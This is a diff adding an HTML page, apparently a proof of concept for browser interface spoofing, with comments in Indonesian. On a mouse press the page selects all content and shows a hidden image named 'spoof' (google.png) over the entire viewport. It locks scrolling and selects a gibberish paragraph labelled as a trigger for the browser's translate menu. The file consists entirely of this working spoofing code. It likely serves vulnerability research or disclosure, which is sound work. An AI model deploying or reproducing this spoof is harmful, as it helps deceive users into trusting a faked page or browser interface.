@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html onmousedown="rfsSelectAll()" onclick="selectAllChildren()">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Full Screen Image Trigger</title>
+    <style>
+      body.fullscreen-active {
+        overflow: hidden;
+      }
+
+      #scroll-filler {
+        height: 10000px;
+      }
+
+      /* Tambahan agar paragraf terlihat jelas */
+      #paragraph1 {
+        font-size: 24px;
+        margin: 40px;
+      }
+    </style>
+  </head>
+
+  <body>
+    <!-- Elemen kosong untuk membuat halaman bisa discroll jauh ke bawah -->
+    <div id="scroll-filler"></div>
+
+    <!-- Paragraf target untuk selectAllChildren -->
+    <p id="paragraph1">
+      <!-- Trigger Translate Menu -->
+      A[= ?:TLv S9y
+      <!-- Trigger Translate Menu -->
+    </p>
+
+    <!-- Gambar disembunyikan, akan muncul penuh saat di-trigger -->
+    <img
+      id="spoof"
+      style="display: none"
+      src="google.png"
+      alt="Fullscreen Image"
+    />
+
+    <!-- Script diletakkan di bagian bawah -->
+    <script>
+      function rfsSelectAll() {
+        document.execCommand("selectAll");
+
+        const img = document.getElementById("spoof");
+
+        img.style.display = "block";
+        img.style.position = "fixed";
+        img.style.top = "0";
+        img.style.left = "0";
+        img.style.width = "100vw";
+        img.style.height = "100vh";
+        img.style.objectFit = "cover";
+        img.style.zIndex = "9999";
+
+        document.body.classList.add("fullscreen-active");
+      }
+
+      function selectAllChildren() {
+        const paragraph = document.getElementById("paragraph1");
+        if (paragraph) {
+          const selection = document.getSelection();
+          selection.removeAllRanges();
+          const range = document.createRange();
+          range.selectNodeContents(paragraph);
+          selection.addRange(range);
+        }
+      }
+    </script>
+  </body>
+</html>
